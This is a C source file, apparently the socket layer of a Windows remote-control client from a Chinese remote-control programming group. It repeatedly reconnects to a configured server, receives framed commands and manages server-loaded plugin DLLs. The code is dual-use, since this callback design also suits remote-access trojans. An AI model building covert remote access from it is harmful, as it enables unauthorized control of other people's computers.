/*
开发作者:可明
开发日期:2010.8
远程控制编程讨论群:30660169,6467438
*/

#include "km_socket.h"

kms_sock_func sock_loop_call[] = {
    kms_sock_re_connect,
    kms_sock_recv,
    kms_sock_close,
    kms_sock_recv_header
};

pio_socket main_soskcet = NULL;
u_long main_time = 0;

CRITICAL_SECTION critical_section;

unsigned long
str_ip_to_long(char * ip)
{
    unsigned long   rip     = 0;
    struct hostent  *host   = NULL;
    host = gethostbyname(ip);
    if(host != NULL) {
        memcpy(&rip,host->h_addr_list[0], host->h_length);
    } else {
        rip = inet_addr(ip);
    }
    return rip;
}

int
kms_sock_re_connect(pio_socket i_socket)
{
    GUID guid_connect_ex = WSAID_CONNECTEX;
    LPFN_CONNECTEX lpfn_connectex;
    DWORD dwBytes;

_start:
    if (i_socket->socket != 0) {
        closesocket(i_socket->socket);
    }

    i_socket->remote_addr.sin_addr.s_addr = str_ip_to_long(g_share_main->remote_addr);

    i_socket->socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, WSA_FLAG_OVERLAPPED);
    if (i_socket->socket == INVALID_SOCKET) {
        goto _start;
    }

    if (CreateIoCompletionPort((HANDLE)i_socket->socket, g_share_main->h_completion_port, (ULONG_PTR)i_socket, 0) == NULL) {
        goto _start;
    }

    if (bind(i_socket->socket, (struct sockaddr * far)&i_socket->local_addr, sizeof(i_socket->local_addr)) == SOCKET_ERROR) {
        goto _start;
    }

    if (WSAIoctl(i_socket->socket, SIO_GET_EXTENSION_FUNCTION_POINTER, &guid_connect_ex, sizeof(guid_connect_ex), &lpfn_connectex, sizeof(lpfn_connectex), &dwBytes, 0, 0) == SOCKET_ERROR) {

        goto _start;
    }

    if (!lpfn_connectex(i_socket->socket, (struct sockaddr* far)&i_socket->remote_addr, sizeof(i_socket->remote_addr), NULL, 0, NULL, &i_socket->overlapped)) {
        if (GetLastError() != WSA_IO_PENDING) {
            goto _exit_err;
        }
    }

    return 1;
_exit_err:
    return 0;
}

int
kms_sock_recv(pio_socket i_socket)
{
    DWORD dwRecv=0,dwFlag=0;
    if (!WSARecv(i_socket->socket, &i_socket->r_buf, 1, &dwRecv, &dwFlag, &i_socket->overlapped, NULL)) {
        if (GetLastError() != WSA_IO_PENDING)
            return 0;
    }
    return 1;
}

int
kms_sock_recv_header(pio_socket i_socket)
{
    DWORD dwRecv=0,dwFlag=0;
    i_socket->r_count = 0;
    i_socket->r_buf.buf = i_socket->i_buffer;
    i_socket->r_buf.len = sizeof(io_data_header);
    if (!WSARecv(i_socket->socket, &i_socket->r_buf, 1, &dwRecv, &dwFlag, &i_socket->overlapped, NULL)) {
        if (GetLastError() != WSA_IO_PENDING)
            return 0;
    }
    return 1;
}

int
kms_sock_close(pio_socket i_socket)
{
    int i;
    //printf("kms_socket_close\n");
    if (i_socket == main_soskcet) {
        main_soskcet = NULL;
        if (g_share_main->km_module_count > 0) {
            for (i=0; i<g_share_main->km_module_count; i++) {
                FreeLibrary(g_share_main->km_modules[i].hModule);
            }
            free(g_share_main->km_modules);
            g_share_main->km_module_count = 0;
        }
    }
    closesocket(i_socket->socket);
    //printf("kms_sock_close:%d\n",g_share_main->c_ver.wVersion);
    if (i_socket->f_call_exit != NULL) {
        if (((kms_sock_func)i_socket->f_call_exit)(i_socket)) {
            i_socket->f_call_work = i_socket->f_temp_call_work;
            kms_sock_re_connect(i_socket);
            return 0;
        }
    }
    free(i_socket);
    return 0;
}

int
kms_sock_send(pio_socket i_socket,unsigned char major_cmd,unsigned char minor_cmd,unsigned long crc32,char *buffer,int length)
{
    int ret = 0;
    io_data_header i_data_header;
    i_data_header.length = length + sizeof(i_data_header);
    i_data_header.crc32 = crc32;
    i_data_header.major_cmd = major_cmd;
    i_data_header.minor_cmd = minor_cmd;
    ret = send(i_socket->socket, (char*)&i_data_header, sizeof(io_data_header), 0);
    if (length > 0) {
        ret += send(i_socket->socket, buffer, length, 0);
    }
    return ret;
}

unsigned __stdcall
kms_sock_loop(void *param)
{
    int ret;
    DWORD dwTrans;
    pio_socket i_socket;
    LPOVERLAPPED lpoverlapped;
    for (;;) {
        i_socket = NULL;
        lpoverlapped = NULL;
        ret = GetQueuedCompletionStatus(g_share_main->h_completion_port, &dwTrans, &i_socket, &lpoverlapped, 1000*60*10);
        if (i_socket == NULL){
            if (ret == 0)
            if (GetLastError() == WAIT_TIMEOUT) {
                EnterCriticalSection(&critical_section);
                if (main_soskcet != NULL) {
                    u_long time = timeGetTime() - main_time;
                    if (time > 540000) {
                        main_time = timeGetTime();
                        SetLastError(0);
                        //closesocket(main_soskcet->socket);
                        //kms_sock_recv_header(main_soskcet);
                        kms_sock_close(main_soskcet);
                    }
                }
                LeaveCriticalSection(&critical_section);
                continue;
            }
        } else {
            ret = ((f_work)i_socket->f_call_work)(ret, dwTrans, i_socket, lpoverlapped);
            if (ret < (sizeof(sock_loop_call)/sizeof(kms_sock_func))) {
                //printf("ret:%d\n", ret);
                sock_loop_call[ret](i_socket);
            }
            //printf("kms_sock_loop:%d\n",g_share_main->c_ver.wVersion);
        }
    }
    return 0;
}

int
kms_main_initialize()
{
    int i;
    WSADATA WSAData;

    WSAStartup(0x202, &WSAData);

    g_share_main->h_completion_port = CreateIoCompletionPort(INVALID_HANDLE_VALUE, 0, 0, 0);

    for (i=0; i<g_share_main->sock_loop_thread_count; i++) {
        g_share_main->sock_loop_thread[i] = (HANDLE)_beginthreadex(NULL, 0, kms_sock_loop, NULL, 0, NULL);
    }

    InitializeCriticalSection(&critical_section);
    return 0;
}

int
kms_sock_connect(char *host,int port,f_work f_connect_event,kms_sock_func f_exit_event,void *extend)
{
    pio_socket i_socket = malloc(sizeof(io_socket));
    memset(i_socket, 0x0, sizeof(io_socket));

    i_socket->extend = extend;
    i_socket->f_call_work = (void*)f_connect_event;
    i_socket->f_temp_call_work = (void*)f_connect_event;
    i_socket->f_call_exit = (void*)f_exit_event;

    i_socket->local_addr.sin_family = AF_INET;
    i_socket->local_addr.sin_port = 0;
    i_socket->local_addr.sin_addr.s_addr = INADDR_ANY;

    i_socket->remote_addr.sin_family = AF_INET;
    i_socket->remote_addr.sin_port = htons(port);

    if (!kms_sock_re_connect(i_socket))
        goto _exit_err;

    return 1;
_exit_err:
    closesocket(i_socket->socket);
    free(i_socket);
    return 0;
}

int
kms_sock_ret_connect(char *host, int port, f_work f_connect_event)
{
    pio_socket i_socket = malloc(sizeof(io_socket));
    memset(i_socket, 0x0, sizeof(io_socket));

    i_socket->socket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, 0, 0, 0);
    if(i_socket->socket == INVALID_SOCKET)
        goto _exit_err;

    i_socket->remote_addr.sin_family      = AF_INET;
    i_socket->remote_addr.sin_port        = htons(port);
    i_socket->remote_addr.sin_addr.s_addr = str_ip_to_long(host);

    if(connect(i_socket->socket,(struct sockaddr*far)&i_socket->remote_addr,sizeof(i_socket->remote_addr)) == SOCKET_ERROR)
        goto _exit_err;

    f_connect_event(1, 0, i_socket, NULL);
    return 1;
_exit_err:
    closesocket(i_socket->socket);
    free(i_socket);
    return 0;
}
